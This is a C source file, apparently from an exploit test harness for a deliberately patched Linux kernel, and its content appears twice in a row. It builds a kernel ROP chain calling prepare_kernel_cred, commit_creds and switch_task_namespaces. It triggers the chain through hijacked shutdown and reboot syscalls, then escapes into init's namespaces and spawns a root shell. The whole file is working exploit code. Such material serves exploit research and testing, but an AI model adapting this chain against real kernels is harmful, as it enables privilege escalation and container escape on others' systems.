/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/reboot.h>
#include <sys/socket.h>
#include <unistd.h>

void pwn() {
  puts("pwn called");
  setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
  setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  setns(open("/proc/1/ns/net", O_RDONLY), 0);

  char *args[] = {"/bin/sh", NULL};
  execve("/bin/sh", args, NULL);

  exit(0);
}

uint64_t _user_rip = (uint64_t)&pwn;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;
uint64_t kbase = 0xffffffff81000000;

void save_state(void) {
  __asm__(
      ".intel_syntax noprefix;"
      "mov _user_cs, cs;"
      "mov _user_ss, ss;"
      "mov _user_sp, rsp;"
      "pushf;"
      "pop _user_rflags;"
      ".att_syntax");
  return;
}

void make_rop_chain(uint64_t *rop) {
  *(rop++) = kbase + 0x300790;  // pop rdi; mov rax, rdi; ret
  *(rop++) = 0x0;
  *(rop++) = kbase + 0x1befb0;  // prepare_kernel_cred
  *(rop++) =
      kbase +
      0x24793d;  // mov rdi, rax; mov qword ptr [rip + 0x30235c1], rdi; ret
  *(rop++) = kbase + 0x1bed10;  // commit_creds
  *(rop++) = kbase + 0x300790;  // pop rdi; mov rax, rdi; ret
  *(rop++) = 0x1;
  *(rop++) = kbase + 0x1b5600;  // find_task_by_vpid
  *(rop++) =
      kbase +
      0x24793d;  // mov rdi, rax; mov qword ptr [rip + 0x30235c1], rdi; ret
  *(rop++) = kbase + 0x1bd180;   // switch_task_namespaces
  *(rop++) = kbase + 0x12010c6;  // kpti_trampoline
  *(rop++) = 0x0;
  *(rop++) = 0x0;
  *(rop++) = _user_rip;
  *(rop++) = _user_cs;
  *(rop++) = _user_rflags;
  *(rop++) = _user_sp;
  *(rop++) = _user_ss;
}

int main() {
  void *fixed_addr = (void *)0x10000;       // Desired address (example)
  size_t size = 0x1000;                     // Size in bytes
  int prot = PROT_READ | PROT_WRITE;        // Permissions (read/write)
  int flags = MAP_PRIVATE | MAP_ANONYMOUS;  // Private, anonymous mapping

  save_state();
  printf(
      "user rip will be %#lx, user_cs: %#lx, user_rflags %#lx, user_sp %#lx\n",
      _user_rip, _user_cs, _user_rflags, _user_sp, _user_ss);
  void *ptr = mmap(fixed_addr, size, prot, flags, -1, 0);
  memset(ptr, 0x41, size);
  make_rop_chain(ptr);
  // the shutdown syscall was overwritten in vmlinux and this call will load the
  // ROP chain into a kernel buffer.
  int result = shutdown(0xfee1dead, SHUT_RD);
  printf("result: %d\n", result);

  // Trigger shutdown
  sync();  // Flush file system buffers
  // the reboot syscall was overwritten in vmlinux and this call triggers a
  // stack pivot to the previously saved ROP chain.
  if (reboot(RB_POWER_OFF) == -1) {
    perror("Error initiating shutdown");
    return 1;
  }

  return 0;
}
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/reboot.h>
#include <sys/socket.h>
#include <unistd.h>

void pwn() {
  puts("pwn called");
  setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
  setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  setns(open("/proc/1/ns/net", O_RDONLY), 0);

  char *args[] = {"/bin/sh", NULL};
  execve("/bin/sh", args, NULL);

  exit(0);
}

uint64_t _user_rip = (uint64_t)&pwn;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;
uint64_t kbase = 0xffffffff81000000;

void save_state(void) {
  __asm__(
      ".intel_syntax noprefix;"
      "mov _user_cs, cs;"
      "mov _user_ss, ss;"
      "mov _user_sp, rsp;"
      "pushf;"
      "pop _user_rflags;"
      ".att_syntax");
  return;
}

void make_rop_chain(uint64_t *rop) {
  *(rop++) = kbase + 0x300790;  // pop rdi; mov rax, rdi; ret
  *(rop++) = 0x0;
  *(rop++) = kbase + 0x1befb0;  // prepare_kernel_cred
  *(rop++) =
      kbase +
      0x24793d;  // mov rdi, rax; mov qword ptr [rip + 0x30235c1], rdi; ret
  *(rop++) = kbase + 0x1bed10;  // commit_creds
  *(rop++) = kbase + 0x300790;  // pop rdi; mov rax, rdi; ret
  *(rop++) = 0x1;
  *(rop++) = kbase + 0x1b5600;  // find_task_by_vpid
  *(rop++) =
      kbase +
      0x24793d;  // mov rdi, rax; mov qword ptr [rip + 0x30235c1], rdi; ret
  *(rop++) = kbase + 0x1bd180;   // switch_task_namespaces
  *(rop++) = kbase + 0x12010c6;  // kpti_trampoline
  *(rop++) = 0x0;
  *(rop++) = 0x0;
  *(rop++) = _user_rip;
  *(rop++) = _user_cs;
  *(rop++) = _user_rflags;
  *(rop++) = _user_sp;
  *(rop++) = _user_ss;
}

int main() {
  void *fixed_addr = (void *)0x10000;       // Desired address (example)
  size_t size = 0x1000;                     // Size in bytes
  int prot = PROT_READ | PROT_WRITE;        // Permissions (read/write)
  int flags = MAP_PRIVATE | MAP_ANONYMOUS;  // Private, anonymous mapping

  save_state();
  printf(
      "user rip will be %#lx, user_cs: %#lx, user_rflags %#lx, user_sp %#lx\n",
      _user_rip, _user_cs, _user_rflags, _user_sp, _user_ss);
  void *ptr = mmap(fixed_addr, size, prot, flags, -1, 0);
  memset(ptr, 0x41, size);
  make_rop_chain(ptr);
  // the shutdown syscall was overwritten in vmlinux and this call will load the
  // ROP chain into a kernel buffer.
  int result = shutdown(0xfee1dead, SHUT_RD);
  printf("result: %d\n", result);

  // Trigger shutdown
  sync();  // Flush file system buffers
  // the reboot syscall was overwritten in vmlinux and this call triggers a
  // stack pivot to the previously saved ROP chain.
  if (reboot(RB_POWER_OFF) == -1) {
    perror("Error initiating shutdown");
    return 1;
  }

  return 0;
}
